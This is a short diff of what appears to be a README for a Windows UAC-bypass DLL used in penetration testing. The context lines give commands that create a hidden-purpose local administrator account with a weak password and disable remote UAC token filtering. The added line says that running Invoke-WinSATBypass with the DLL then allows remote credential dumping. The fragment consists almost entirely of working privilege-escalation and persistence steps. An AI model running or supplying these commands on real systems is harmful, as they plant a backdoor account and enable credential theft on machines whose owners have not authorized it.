@@ -25,6 +25,7 @@ net user pentester pentest /add
 net localgroup Administrators pentester /add
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 ```
+After running Invoke-WinSATBypass with this DLL, you should be able to dump credentials remotely with the local admin account `pentester` / `pentest`
 
 ---
 
